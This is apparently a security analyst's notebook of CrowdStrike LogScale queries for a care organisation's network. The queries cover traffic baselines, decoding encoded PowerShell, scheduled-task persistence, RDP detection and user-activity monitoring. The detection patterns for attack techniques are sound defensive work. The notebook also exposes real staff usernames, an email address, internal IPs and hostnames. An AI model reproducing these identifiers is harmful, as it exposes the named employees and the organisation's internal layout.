+#repo=ucq-palofirewall
+| bucket(span=1d, function=[
+    sum(BytesReceived, as=TotalBytesRecieved), 
+    sum(BytesSent, as=TotalBytesSent)])
+| dayofweek := time:dayOfWeek(_bucket)            //Gets the day of the week from 1 (Monday) to 7 (Sunday) of a timestamp field. 
+| weekofyear := time:weekOfYear(_bucket)           //Gets the week number within a year of a timestamp (a value from 1 to 53) week starts on Monday
+| groupBy([dayofweek], function=[
+    avg(TotalBytesRecieved, as=AvgBytesReceived),
+    avg(TotalBytesSent, as=AvgBytesSent)
+])
+| unit:convert(AvgBytesReceived, as="AvgMBytesReceived", to="M") | format("%.2f", field=AvgMBytesReceived, as=avgMBReceived)
+| unit:convert(AvgBytesSent, as="AvgMBytesSent", to="M") | format("%.2f", field=AvgMBytesSent, as=avgMBSent)
+| select([dayofweek, avgMBSent, avgMBReceived])
+
+```
+
+
+
+
+
+
+# compare sent received traffic with the average per day over the last 30 days 
+```s
+#repo=ucq-palofirewall
+| aadayofweek := time:dayOfWeek(@timestamp)
+| join( 
+    { 
+/* START JOIN QUERY */
+        bucket(span=1d, function=[
+            sum(BytesReceived, as=TotalBytesReceived), 
+            sum(BytesSent, as=TotalBytesSent)])
+        | dayofweek := time:dayOfWeek(_bucket)            //Gets the day of the week from 1 (Monday) to 7 (Sunday) of a timestamp field. 
+        | weekofyear := time:weekOfYear(_bucket)           //Gets the week number within a year of a timestamp (a value from 1 to 53) week starts on Monday
+        | year := time:year(_bucket)
+        | groupBy([year,weekofyear,dayofweek], function=[
+            sum(TotalBytesReceived, as=totalBytesReceived),
+            sum(TotalBytesSent, as=totalBytesSent)
+        ])
+        | groupBy([year, dayofweek], function=[
+            avg(field=totalBytesReceived, as=avgBytesReceived),
+            avg(field=totalBytesSent, as=avgBytesSent)
+        ])
+/* END JOIN QUERY */
+    }, 
+    field=aadayofweek, 
+    key=dayofweek, 
+    include=[year, dayofweek, avgBytesReceived, avgBytesSent], 
+    start="30d", 
+    mode=left)
+
+/*sum bytes */
+| groupBy([aadayofweek, year, dayofweek, avgBytesReceived, avgBytesSent], function=[
+    sum(BytesReceived, as=totalBytesReceived),
+    sum(BytesSent, as=totalBytesSent)])
+
+/*calculations */
+| unit:convert(totalBytesReceived, as="totalMBytesReceived", to="M") | format("%.2f", field=totalMBytesReceived, as=totalMBytesReceived)
+| unit:convert(avgBytesReceived, as="avgMBytesReceived", to="M") | format("%.2f", field=avgMBytesReceived, as=avgMBytesReceived)
+| prcntReceived := (totalMBytesReceived/avgMBytesReceived)*100 | format("%,.0f", field=prcntReceived, as=prcntReceived)
+
+| unit:convert(totalBytesSent, as="totalMBytesSent", to="M") | format("%.2f", field=totalMBytesSent, as=totalMBytesSent)
+| unit:convert(avgBytesSent, as="avgMBytesSent", to="M") | format("%.2f", field=avgMBytesSent, as=avgMBytesSent)
+| prcntSent := (totalMBytesSent/avgMBytesSent)*100 | format("%,.0f", field=prcntSent, as=prcntSent)
+
+| select([aadayofweek, year, dayofweek, 
+      totalMBytesReceived, avgMBytesReceived, prcntReceived
+    , totalMBytesSent, avgMBytesSent, prcntSent
+])
+
+/* need to combine to get a single number for prcnt, another average? 
+| groupBy([year], function=[
+      sum(totalMBytesReceived, as="totalMBytesReceived")
+    , sum(totalMBytesSent, as="totalMBytesSent")
+    , avg(avgMBytesReceived, as="avgMBytesReceived")
+    , avg(avgMBytesSent, as="avgMBytesSent")
+    , avg(prcntReceived, as="prcntReceived")
+    , avg(prcntSent, as="prcntSent")
+])*/
+
+
+```
+v2
+```sh
+
+#repo=ucq-palofirewall
+| now(as=n) 
+| aadayofweek := time:dayOfWeek(n)      //time:dayOfWeek(now)
+/*get yesterdays full results */
+| case {
+      aadayofweek = 1 | aadayofweek := 7;    //monday back to sunday
+    * |                 aadayofweek := aadayofweek - 1;
+}
+| join( 
+    { 
+/* START JOIN QUERY */
+        bucket(span=1d, function=[
+            sum(BytesReceived, as=TotalBytesReceived), 
+            sum(BytesSent, as=TotalBytesSent)])
+        | dayofweek := time:dayOfWeek(_bucket)            //Gets the day of the week from 1 (Monday) to 7 (Sunday) of a timestamp field. 
+        | weekofyear := time:weekOfYear(_bucket)           //Gets the week number within a year of a timestamp (a value from 1 to 53) week starts on Monday
+        | year := time:year(_bucket)
+        | groupBy([year,weekofyear,dayofweek], function=[
+            sum(TotalBytesReceived, as=totalBytesReceived),
+            sum(TotalBytesSent, as=totalBytesSent)
+        ])
+        | groupBy([year, dayofweek], function=[
+            avg(field=totalBytesReceived, as=avgBytesReceived),
+            avg(field=totalBytesSent, as=avgBytesSent)
+        ])
+/* END JOIN QUERY */
+    }, 
+    field=aadayofweek, 
+    key=dayofweek, 
+    include=[year, dayofweek, avgBytesReceived, avgBytesSent], 
+    start="30d", 
+    mode=inner)
+
+/*sum bytes */
+| groupBy([dayofweek, year, dayofweek, avgBytesReceived, avgBytesSent], function=[
+    sum(BytesReceived, as=totalBytesReceived),
+    sum(BytesSent, as=totalBytesSent)])
+
+/*calculations */
+| unit:convert(totalBytesReceived, as="totalMBytesReceived", to="M") | format("%.2f", field=totalMBytesReceived, as=totalMBytesReceived)
+| unit:convert(avgBytesReceived, as="avgMBytesReceived", to="M") | format("%.2f", field=avgMBytesReceived, as=avgMBytesReceived)
+| prcntReceived := (totalMBytesReceived/avgMBytesReceived)*100 | format("%,.0f", field=prcntReceived, as=prcntReceived)
+
+| unit:convert(totalBytesSent, as="totalMBytesSent", to="M") | format("%.2f", field=totalMBytesSent, as=totalMBytesSent)
+| unit:convert(avgBytesSent, as="avgMBytesSent", to="M") | format("%.2f", field=avgMBytesSent, as=avgMBytesSent)
+| prcntSent := (totalMBytesSent/avgMBytesSent)*100 | format("%,.0f", field=prcntSent, as=prcntSent)
+
+| select([aadayofweek, year, dayofweek, 
+      totalMBytesReceived, avgMBytesReceived, prcntReceived
+    , totalMBytesSent, avgMBytesSent, prcntSent
+])
+| sort(dayofweek, limit=1)
+
+/* need to combine to get a single number for prcnt, another average? 
+| groupBy([year], function=[
+      sum(totalMBytesReceived, as="totalMBytesReceived")
+    , sum(totalMBytesSent, as="totalMBytesSent")
+    , avg(avgMBytesReceived, as="avgMBytesReceived")
+    , avg(avgMBytesSent, as="avgMBytesSent")
+    , avg(prcntReceived, as="prcntReceived")
+    , avg(prcntSent, as="prcntSent")
+])*/
+
+
+
+```
+digging further
+```s
+/* SPIKE IN TRAFFIC */
+#repo=ucq-palofirewall
+| now(as=n) 
+| bucket(span=1d, function=[sum(BytesSent, as=BytesSentDay)])           //      , sum(BytesReceived, as=BytesReceivedDay)
+| dayOfWeek := time:dayOfWeek(_bucket)
+| currentWeekOfYear := time:weekOfYear(_bucket)
+| formattime("%A %d %B %Y, %R", as=fmttime, field=_bucket, timezone="Australia/Brisbane")
+| lastweekday := (_bucket - (7*24*60*60*1000))
+| dayOfWeek = 3
+
+```
+
+
+
+
+
+# execution chain
+```sh
+
+#event_simpleName=*
+
+//| /grandparent/i
+//| /treeid/i
+//| aid = a7aa650d77a64ef285258d3924840aa5    //lachy
+| GrandParentBaseFileName !=/PanGpHip/i
+//| DomainName = * 
+| select(fields=[GrandParentBaseFileName, ParentBaseFileName, ImageFileName, DomainName])
+//| /winword|excel|outlook/i
+
+| ExecutionChain:=format(format="%s\n\t└ %s \n\t\t└ %s", field=[GrandParentBaseFileName, ParentBaseFileName, CommandLine])
+| select([CommandLine,ExecutionChain])
+
+
+```
+
+
+
+## function query (it worked once)
+```sh
+/* 
+query   :   qryEnrichCS-ip
+desc    :   returns known information about an ip based on the crowdstrike data 
+input   :   ip
+output  :   ip,name, datasource,lastupdated
+usage   :   $qryEnrichCS-ip(ip=SourceIP)
+*/
+//| SourceIP = ?ip
+#repo=unitingcare-queensland
+| LocalAddressIP4 = ?ip
+| select([LocalAddressIP4, ComputerName, aid, description])
+| match(file="enrich_ip.csv", column=ip, field=LocalAddressIP4, include=[ip,description, datasource,lastupdated], mode=cidr, strict=false)
+
+
+```
+
+## it worked twice
+```s
+
+#repo=ucq-palofirewall
+| SourceIP = 10.98.11.7
+| join(query={
+    "#event_simpleName"=LocalIpAddressIP4
+    | !in(field=InterfaceDescription, values=["*Hyper*"])
+    | select([@timestamp, ComputerName, LocalAddressIP4, aid])
+    | groupBy([ComputerName], function=(selectLast([LocalAddressIP4, aid])))
+}, field=SourceIP, key=LocalAddressIP4, repo="unitingcare-queensland", include=[ComputerName, aid, LocalAddressIP4])
+| select([ComputerName, aid, LocalAddressIP4, DestinationIP])
+
+```
+l
+
+
+# DO NOT DELETE!!!
+```s
+#repo=ucq-palofirewall
+| SourceIP = 10.98.11.7
+| join(query={
+    "#event_simpleName"=LocalIpAddressIP4
+    | !in(field=InterfaceDescription, values=["*Hyper*"])
+    | select([@timestamp, ComputerName, LocalAddressIP4, aid])
+    | groupBy([ComputerName], function=(selectLast([LocalAddressIP4, aid])))
+}, field=SourceIP, key=LocalAddressIP4, repo="unitingcare-queensland", include=[ComputerName, aid, LocalAddressIP4])
+| select([@timestamp, ComputerName, aid, LocalAddressIP4, DestinationIP])
+| join({#event_simpleName=UserLogon}, field=aid, include=UserName, mode=left)
+| match(file=enrich_ip.csv, field=LocalAddressIP4, column=ip, mode=cidr, include=[description])
+```
+
+
+
+
+# difference from last week
+```
+| bucket(span=1d, function=[
+    sum(BytesSent, as=prvTotalBytesSent), 
+    sum(BytesReceived, as=prvTotalBytesReceived)])
+| prv := (_bucket - (7*24*60*60*1000))  | formattime("%A %d %B %Y, %R", as=prvTimeFormat, field=prv, timezone="Australia/Brisbane")
+| cur := _bucket                        | formattime("%A %d %B %Y, %R", as=curTimeFormat, field=cur, timezone="Australia/Brisbane")
+| select([cur, curTimeFormat, prv, prvTimeFormat, prvTotalBytesSent, prvTotalBytesReceived])
+| rename(prvTotalBytesSent, as="EVENTprvTotalBytesSent")
+| rename(prvTotalBytesReceived, as="EVENTprvTotalBytesReceived")
+| match(file="prv.csv", field=cur, column=prv)
+| difference := (EVENTprvTotalBytesSent / prvTotalBytesSent) * 100
+| select([cur, curTimeFormat, EVENTprvTotalBytesSent, EVENTprvTotalBytesReceived, prv, prvTimeFormat, prvTotalBytesSent, prvTotalBytesReceived, difference])
+
+
+```
+```sh
+
+#repo=ucq-palofirewall
+| domain = /ext/i                   //external firewalls 
+| Type = TRAFFIC                    //only want traffic
+/* 
+| bucket(span=1d, 
+    function=[
+        sum(BytesSent, as=prvTotalBytesSent), 
+        sum(BytesReceived, as=prvTotalBytesReceived)
+    ]
+)
+| prv := (_bucket - (7*24*60*60*1000))  | formattime("%A %d %B %Y, %R", as=prvTimeFormat, field=prv, timezone="Australia/Brisbane")         // prv is exactly one week earlier
+| cur := _bucket                        | formattime("%A %d %B %Y, %R", as=curTimeFormat, field=cur, timezone="Australia/Brisbane")         // cur is the bucket
+| prvTotalBytesSent > 0             // ignore anything that is less than zero
+| select([
+            cur, 
+            curTimeFormat,       // not used in generating file
+            prv, prvTimeFormat, prvTotalBytesSent, prvTotalBytesReceived            //export prv in friendly time cause I cant convert to epoch in my head 
+])
+*/
+////////////////// up to here is what generates the file as well
+| $qryGet-BytesSentReceivedTotal()          //using a saved query
+
+| rename(prv, as=EVENTprv)
+| rename(curTimeFormat, as="EVENTTimeFormat") 
+| rename(prvTotalBytesSent, as="EVENTTotalBytesSent")
+| rename(prvTotalBytesReceived, as="EVENTTotalBytesReceived")
+
+| match(file="fw-external-sendreceivehistory.csv", field=EVENTprv, column=cur, strict=false)         // the prv field in the event query maps to the cur field in the csv
+| diffSent := (EVENTTotalBytesSent / prvTotalBytesSent) * 100 
+| diffReceived:= (EVENTTotalBytesReceived / prvTotalBytesReceived) * 100
+
+| select([cur, EVENTTimeFormat, EVENTTotalBytesSent, EVENTTotalBytesReceived, EVENTprv, 
+    curTimeFormat, prvTotalBytesSent, prvTotalBytesReceived, diffSent, diffReceived])
+
+
+| sort(cur, order=desc)
+
+```
+
+
+
+
+
+# rulename difference from last week.
+```sh
+#repo=ucq-palofirewall
+| bucket(span=1d, 
+    field=RuleName, limit=500,
+    function=[
+        sum(BytesSent, as=prvTotalBytesSent), 
+        sum(BytesReceived, as=prvTotalBytesReceived)
+    ]
+)
+| prv := (_bucket - (7*24*60*60*1000))  | formattime("%A %d %B %Y, %R", as=prvTimeFormat, field=prv, timezone="Australia/Brisbane")         // prv is exactly one week earlier
+| cur := _bucket                        | formattime("%A %d %B %Y, %R", as=curTimeFormat, field=cur, timezone="Australia/Brisbane")         // cur is the bucket
+| prvTotalBytesSent > 0             // ignore anything that is less than zero
+| select([
+            RuleName,
+            cur, 
+            curTimeFormat,       // not used in generating file
+            prv, prvTimeFormat, prvTotalBytesSent, prvTotalBytesReceived            //export prv in friendly time cause I cant convert to epoch in my head 
+])
+
+```
+
+
+
+
+# sqqpoint01
+https://ucareqld.logscale.us-2.crowdstrike.com/mitre-poc/search?%24alpha-2=AU&%24alpha2=CN&end=1718891999999&live=false&query=%23repo%20%3D%20ucq-ad%0A%7C%20%2FSQPPOINT01%2Fi%20%2F%2F%7C%20%2FBLUECARE%2Fi%0A%7C%20splitString(field%3D%40rawstring%2C%20by%20%3D%20%22New%20Logon%3A%22)%0A%7C%20regex(field%3D%22_splitstring%5B1%5D%22%2C%20regex%3D%22(%3F%3CNewAC%3E%5E%5CtAccount%20Name%3A(%5C%5Cs.*))%22%2C%20repeat%3Dtrue)%0A%7C%20regex(field%3D%22_splitstring%5B0%5D%22%2C%20regex%3D%22(%3F%3CFirstLine%3E%5E(.*))%22%2C%20flags%3Dm)%0A%2F%2F%7C%20!%20in(field%3DAC%2C%20values%3D%5B%22*%24%22%5D%2C%20ignoreCase%3Dtrue)%20%20%20%20%20%20%20%20%20%20%2F%2Fremove%20noise%0A%7C%20formattime(%22%25A%20%25d%20%25B%20%25Y%2C%20%25R%22%2C%20as%3Dfmttime%2C%20field%3D%40timestamp%2C%20timezone%3D%22Australia%2FBrisbane%22)%0A%7C%20select(%5Bfmttime%2C%20%40collect.id%2C%20%40collect.timestamp%2C%20NewAC%2C%20FirstLine%5D)%0A&start=1718546400000&tz=Australia%2FBrisbane
+```sh
+#repo = ucq-ad
+| /SQPPOINT01/i //| /BLUECARE/i
+| splitString(field=@rawstring, by = "New Logon:")
+| regex(field="_splitstring[1]", regex="(?<NewAC>^\tAccount Name:(\\s.*))", repeat=true)
+| regex(field="_splitstring[0]", regex="(?<FirstLine>^(.*))", flags=m)
+//| ! in(field=AC, values=["*$"], ignoreCase=true)          //remove noise
+| formattime("%A %d %B %Y, %R", as=fmttime, field=@timestamp, timezone="Australia/Brisbane")
+| select([fmttime, @collect.id, @collect.timestamp, NewAC, FirstLine])
+
+
+```
+
+
+
+
+
+
+# average traffic against todays sum
+```sh
+#repo=ucq-palofirewall
+| Type=TRAFFIC                      //only traffic data
+// make friendly names
+| case {
+    domain = "TSCPH-CORE-FW-*"      | grpDomain := "TSCPH[Buderim]";                    //BUDERIM
+    domain = "SSHB-CORE-FW-*"       | grpDomain := "SSHB[StStephens]";                  //ST STEPHENS
+    domain = "TWH-CORE-FW-*"        | grpDomain := "TWH[Wesley]";                       //WESLEY
+    domain = "SAW-CORE-FW-*"        | grpDomain := "SAW[StAndrews]";                    //ST ANDREWS
+    domain = "*-*-FW-EXT*"          | grpDomain := "EXTERNAL";                          //EXTERNAL
+    domain = "*-*-FW-INT*"          | grpDomain := "INTERNAL";                          //INTERNAL
+    *                               | grpDomain := "excluded"                           //EXCLUDED
+}
+/****************************/
+// group into 1d sum BytesSent
+| bucket(
+    span=1d,
+    field=grpDomain, 
+    function=[
+        sum(BytesSent, as=sumBytesSent)
+    ]
+)
+// get average and max bucket (this will be todays sum)
+| groupBy(grpDomain,
+    function=[
+        avg(sumBytesSent, as=DailyAverage),                                     // get daily average
+        selectFromMax(field="_bucket", include=[sumBytesSent,grpDomain]),       // get sum last _bucket aka today
+        count(as=DayCount)                                                      // number of days checked for average
+])
+| rename(field=_avg, as=DailyAverage)
+| rename(field=sumBytesSent, as=DailyTotal)
+| DailyPercentage := DailyTotal/DailyAverage * 100
+| format("%,.2f", field=DailyPercentage, as=DailyPercentage)
+| case {
+    DailyPercentage > 130   | icon:="🔴" | status:="ALERT";
+    DailyPercentage > 100   | icon:="🟠" | status:="WARN";      
+    DailyPercentage < 100   | icon:="🟢" | status:="OK";
+}
+| select(fields=[icon,status,grpDomain,DailyPercentage,DayCount])
+```
+
+
+## AD first line
+```sh
+#repo=ucq-ad
+| regex(field=@rawstring, regex="(?<FirstLine>^(.*))")
+| select(fields=[@timestamp, windows.EventData.TargetUserName, FirstLine, @rawstring])
+| /dburgess2/i
+
+```
+
+## friendly messages
+```sh
+#repo=unitingcare-queensland
+| UserName = *
+| UserName = ?user
+| in(field=#event_simpleName, values=["ScreenshotTakenEtw", "*FileWritten*", "UserLogon", "UserLogoff"])
+| case{
+    #event_simpleName = *FileWritten*       | 
+        case {
+            IsOnRemovableDisk=1 | usb := "USB DRIVE";
+            usb := ""
+        }
+        |format("wrote file to %s %s",field=[usb, TargetFileName],as=msg);
+    #event_simpleName=UserLogon             | format("logged in to %s",field=[ComputerName],as=msg);
+    #event_simpleName=UserLogoff            | format("logged out of %s",field=[ComputerName],as=msg);
+    #event_simpleName=ScreenshotTakenEtw    | format("took screenshot on %s",field=[ComputerName],as=msg);
+}
+| groupBy([@timestamp, ComputerName, UserName, msg])
+| select(fields=[@timestamp, ComputerName, UserName,msg]) | tail(1000) | sort(field=@timestamp, order=asc, limit=1000)
+ /* */
+
+
+```
+
+
+# qryMitre-Persistence-ScheduledTask
+
+```sh
+
+/* 
+query   :   qryMitre-Persistence-ScheduledTask
+mitre   :   https://attack.mitre.org/techniques/T1053/
+desc    :   returns if there is registration of a scheduled task
+input   :   none
+output  :   UserName, ComputerName, TaskName, TaskExecCommand
+usage   :   $qryMitre-Persistence-ScheduledTask
+notes   :   
+20240715 AS modifed to check for any changes to scheduled tasks, not just new ones. query renamed from -ScheduledTaskRegistered to -ScheduledTask. Thanks Mel!
+*/
+#repo = unitingcare-queensland
+| #event_simpleName=/ScheduledTask*/i                           
+| concat([TaskName, TaskExecCommand, TaskExecArguments], as=TaskCommand)
+
+/* exclusions */
+| TaskExecCommand = *
+| UserName != "*$"          // local service account
+| TaskCommand != /User_Feed_Synchronization-{[0-9A-Fa-f]{8}(?:-[0-9A-Fa-f]{4}){3}-[0-9A-Fa-f]{12}}C:\\Windows\\system32\\msfeedssync.exesync/i
+| TaskCommand != /Microsoft\\Windows\\InstallService\\SmartRetry/i
+| TaskCommand != /Microsoft\\Windows\\EnterpriseMgmtNonCritical\\[0-9A-Fa-f]{8}(?:-[0-9A-Fa-f]{4}){3}-[0-9A-Fa-f]{12}\\Queued Schedule created for queued alerts%windir%\\system32\\deviceenroller.exe\/o "[0-9A-Fa-f]{8}(?:-[0-9A-Fa-f]{4}){3}-[0-9A-Fa-f]{12}" \/c \/[q|y]/i
+| TaskCommand != /Microsoft\\Windows\\GroupPolicy\\{[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}}gpupdate.exe \/target:computer/i
+| TaskCommand != /Microsoft\\Windodws\\EnterpriseMgmt\\[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}\\PushRenewal%windir%\\system32\\deviceenroller.exe\/o "[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}" \/c \/y/i
+| TaskCommand != /OneDrive Reporting Task-S-1-[0-59]-\d{2}-\d{8,10}-\d{8,10}-\d{8,10}-[1-9]\d{4}C:\\Program Files\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe\/reporting/i
+| groupby(TaskCommand) | sort(_count)
+
+//| rename(#event_simpleName, as=SimpleName)
+//| groupBy([SimpleName, UserName, ComputerName, TaskName, TaskExecCommand])
+//| sort(_count,order=desc, limit=10000)
+
+
+
+```
+
+
+
+# match windows events 
+```sh
+#repo=ucq-ad
+| /domain admins/i
+| match(file="Windows-WinEventCodes.csv", field=#windows.EventID, column=EventID)
+| windows.EventData.MemberName = *
+| select([@timestamp, Description, windows.EventData.SubjectUserName, windows.EventData.MemberName])
+
+```
+
+
+
+
+
+# join firewall source and destination ip data to crowdstrike
+```sh
+| domain = /int|ext/i
+| RuleName = "UCQ_LAN_FBAU_Cloud_Follow_me_Print_Test Policy_App addition"
+//| count()       //  547251                          doing counts after each join means we can very getting the same number of results
+| join(
+    query={ 
+        kvParse()
+        | UserName=* // wildcard means must contain a value
+        | Username!="*$" // Managed service accounts are identified by ending in a dollar sign ($) so exclude them
+    },
+    field=SourceIP,                                 //pk in outer query
+    key=LocalAddressIP4,                            //pk in this query
+    include=[ComputerName, UserName, event_platform],    
+    mode=left,
+    max=1,
+    repo="unitingcare-queensland"
+) | rename(field="ComputerName", as="srcComputerName") | rename(field="UserName", as="srcUserName") | rename(field="event_platform", as="srcEventplatform")
+| formattime("%A %d %B %Y, %R", as=friendlyTimestamp, field=@timestamp, timezone="Australia/Brisbane")
+//| count()       //  547251                          doing counts after each join means we can very getting the same number of results
+//destination ip
+| join(
+    query={ 
+        kvParse()
+        | UserName=* // wildcard means must contain a value
+        | Username!="*$" // Managed service accounts are identified by ending in a dollar sign ($) so exclude them
+    },
+    field=DestinationIP,                                 //pk in outer query
+    key=LocalAddressIP4,                            //pk in this query
+    include=[ComputerName, UserName, event_platform],    
+    mode=left,
+    max=1,
+    repo="unitingcare-queensland"
+) | rename(field="ComputerName", as="dstComputerName") | rename(field="UserName", as="dstUserName") | rename(field="event_platform", as="dstEventplatform")
+| formattime("%A %d %B %Y, %R", as=friendlyTimestamp, field=@timestamp, timezone="Australia/Brisbane")
+//| count()       //  547251                          doing counts after each join means we can very getting the same number of results
+| select([friendlyTimestamp,srcComputerName, srcEventplatform, dstComputerName, dstEventplatform, @rawstring]) | tail(10000)
+ 
+
+```
+
+
+
+# RDP CONNECTION FROM INTERNAL TO EXTERNAL 
+```sh
+| #repo=ucq-palofirewall
+| Protocol = tcp
+| DestinationPort = 135 
+| cidr(SourceIP, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])
+| NOT cidr(DestinationIP, subnet=["127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "::1"])
+```
+
+
+# INSTALLED APPLICATIONS
+```sh
+#repo=unitingcare-queensland
+| ComputerName = /UCL-GT7BSV3|UCQ-CYBER-P002/i
+| /InstalledApplication/i
+| case {
+    UpdateFlag=0 | updateflagmsg:= "UPDATE_INVALID";
+    UpdateFlag=1 | updateflagmsg:= "UPDATE_ENUMERATION";
+    UpdateFlag=2 | updateflagmsg:= "UPDATE_REMOVED";
+    UpdateFlag=3 | updateflagmsg:= "UPDATE_ADDED";
+    UpdateFlag=4 | updateflagmsg:= "UPDATE_OBSOLETE";    
+    UpdateFlag=5 | updateflagmsg:= "UPDATE_REVISED";
+    * | updateflagmsg:="unspecified"
+}
+| join({#event_simpleName=UserLogon}, field=aid, include=UserName, mode=left)
+| select([@timestamp, AppName, ComputerName, UserName, UpdateFlag, updateflagmsg])
+
+
+```
+
+
+# HUNTING FOR -encodedCommand IN POWERSHELL
+```sh
+// finds commandline arguments containing "-encodedCommand" and decodes them from base64
+#repo=unitingcare-queensland
+//| #event_simpleName = ProcessRollup2
+| CommandLine = /-encodedCommand/i
+| regex(field=CommandLine, regex="(?i)-EncodedCommand\\s+(?P<enc>\\S+)", repeat=false)
+| decoded := base64Decode(field=enc, charset="UTF-16LE")
+| select(fields=[@timestamp, UserName, ComputerName, decoded])
+
+```
+
+# qryEnrich
+```sh
+/* 
+query   :   qryEnrich
+desc    :   enriches with ucq data 
+input   :   type[domain OR ip_range]
+            expects a field named matchOn containing the data to match on
+output  :   domain OR ip_range
+usage   :   $qryEnrich(ip=SourceIP)
+*/
+| enrichType:= ?type
+| case {
+    enrichType = /domain/i      
+        | match(file="ucq-fqdn.json", column=fqdn, field=matchOn, strict=false, include=[ucqEntityGuid, matchOn], mode=glob)
+        | ioc:lookup(field=matchOn,type="domain",confidenceThreshold=low)
+    ;
+    enrichType = /ip_address/i  
+        | match(file="ucq-cidr.json", column=cidr, field=matchOn, strict=false, include=[ucqEntityGuid], mode=cidr)
+        | ioc:lookup(field=matchOn, type="ip_address", confidenceThreshold=low)
+    ;
+}
+| match(file="ucq-entity.json", field=ucqEntityGuid, strict=false, include=[ucqEntityName, ucqEntityDescription, ucqEmailRisk, ucqBrowseRisk, ucqNotes])
+| case {
+    ioc.detected = true | 
+        case {
+            ioc[0].malicious_confidence = "high"        | iocIcon:="🔴";        //high
+            ioc[0].malicious_confidence = "medium"      | iocIcon:="🟠";        //medium
+            ioc[0].malicious_confidence = "low"         | iocIcon:="🟡";        //low
+            *                                           | iocIcon:="⚫";        //unconfirmed
+        };
+    *                                                   | iocIcon:="🟢";
+}
+
+
+
+```
+
+# browser extensions
+```sh
+#repo=unitingcare-queensland
+| #event_simpleName = /InstalledBrowserExtension/i
+| BrowserExtensionId!="no-extension-available"
+| case{
+    BrowserName="3" | BrowserName:="Chrome";
+    BrowserName="4" | BrowserName:="Edge";
+    * | BrowserName:="not chrome or edge";
+}
+| BrowserName="Chrome"
+//| groupBy([BrowserName, BrowserExtensionName], function=[count(), collect([ComputerName], separator=",", limit=5000), collect(UserName, separator=";", limit=5000)], limit=5000)
+// full list for export to excel 
+//| select(fields=[BrowserName, BrowserExtensionName, ComputerName, UserName])
+
+```
+
+
+
+# matching on in memory table
+
+```sh
+
+defineTable(
+    query={
+        #event_simpleName="UserLogon" LogonType=10
+        | bucket(field=["UserName", "LogonServer"], span=1h, function=count(as=hourly_login_count), limit=500)
+        | hourly_login_count > 0
+        | groupBy(["UserName", "LogonServer"], function=[
+            avg(hourly_login_count, as=hourly_average_login_count),
+            stdDev(hourly_login_count, as=hourly_stddev_login_count)
+        ])
+    },
+    include=[*],
+    name="user_login_baseline",
+    start=7d,
+    end=1h
+)
+// | readfile("user_login_baseline")
+| #event_simpleName=UserLogon LogonType=10
+| groupBy(["UserName", "LogonServer"], function=[count(field="AuthenticationId", as=total_logins, distinct=true)])
+| match(file="user_login_baseline", field=["UserName", "LogonServer"], strict=false)        //MATCHING ON IN MEMORY TABLE
+| threshold := hourly_average_login_count + (2.5 * hourly_stddev_login_count)
+| case {
+    threshold!=* | threshold := "0"; // User not in baseline
+    *;
+}
+| test(total_logins>threshold)
+
+
+```
+
+
+# falcon helper
+```sh
+#event_simpleName=UserLogon
+| $falcon/helper:enrich(field=LogonType)
+| table([@timestamp, aid, ComputerName, UserName, LogonType], limit=100)
+```
+https://www.reddit.com/r/crowdstrike/comments/18off35/20231222_cool_query_friday_new_feature_in_raptor/
+
+
+
+# $ucq-repo-palofirewall()
+
+```sh
+| Type=TRAFFIC 
+| in(field=domain, values=["*-INT*"]) 
+| RuleName = "FujifilmAD_to_UCQ_INT_AD_OnewayTrus"           //"{ruleName}" 
+| case {
+    cidr(DestinationIP, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]) | direction:="internal";
+    * | direction:="external"    
+}
+| groupBy(field=[direction, SourceZone, SourceIP, DestinationZone, DestinationIP, NATSourceIP, NATDestinationIP, Application, DestinationPort, Protocol], limit=350000)
+```
+
+
+
+# read a file and do stuff with it
+```sh
+
+readfile(file="ucq-fle-vulnerablities.csv")
+| parseTimestamp(field="Last patched", "yyyy-MM-dd'T'HH:mm:ss'Z'", timezone="Zulu", as=LastPatchedTimestamp)
+| age := now() -LastPatchedTimestamp
+| formatDuration(field=age, as=age,precision=0)
+| splitString(age, by="d", as=workingDays)
+| yearsdays := workingDays[0]
+| case {
+    yearsdays = /y/i 
+        | splitString(yearsdays, by="y", as=tempYears) | daysSincePatched:= (tempYears[0] * 365) + tempYears[1];
+    * | daysSincePatched:= (yearsdays);
+}
+| drop([tempYears[0], tempYears[1], workingDays[0], workingDays[1], yearsdays])
+| select([Domain, Hostname, "Last patched", "Local IP", "OS Build", "OS version", daysSincePatched])
+
+```
+
+
+# csv containing tags separated by ;
+```sh
+
+/* 
+ucq-fle-tags.csv
+--------------------------
+url,tags,notes
+t.co,phishing;c&c,20250219 added from lots-project
+appdomain.cloud,phishing;download;c&c;exfiltration,20250219 added from lots-project
+*/
+readfile(file="ucq-fle-tags.csv")
+//  can split
+//| splitString(field=tags, by=";", as=tags)
+//  can search
+//| tags = /download/i
+//  can group?
+| splitString(field=tags, by=";", as=tags)
+| split(tags)
+| groupBy([tags], function=[count(), collect(url)])  
+
+
+
+```
+
+# mimecast emails sent by user
+```sh
+$ucq-repo-mimecast()
+| email.sender.address = "asunta.keny@uccommunity.org.au" //17
+| email.direction = outbound
+| select(["@timestamp","email.sender.address", "email.to.address[0]", "email.subject"])
+| formatTime(format="%F", as="readabledate", field=@timestamp)
+
+
+```
+
+
+
+# wip 
+```sh
+| readfile(file="ucq-fle-watchlist.csv")
+    | rename(field="DisplayName", as="displayname") 
+    | rename(field="Domain", as="domain") | lower(domain, as=domain)
+    | rename(field="Name", as="ntlm") | lower(ntlm, as=ntlm)
+    | splitString(as=newstring, by="\\\\", field=ntlm) | username:=newstring[1]
+    | case {
+        ntlm = /lccq.org.au/i           | replace(field=ntlm, regex="lccq.org.au", flags="i", with="lccq");
+        ntlm = /int.ucq.com.au/i        | replace(field=ntlm, regex="int.ucq.com.au", flags="i", with="int");
+        ntlm = /uhc.uc.com.au/i         | replace(field=ntlm, regex="uhc.uc.com.au", flags="i", with="uhc");
+        ntlm = /uc.com.au/i             | replace(field=ntlm, regex="uc.com.au", flags="i", with="uc");
+        ntlm = /ext.ucq.com.au/i        | replace(field=ntlm, regex="ext.ucq.com.au", flags="i", with="ext");
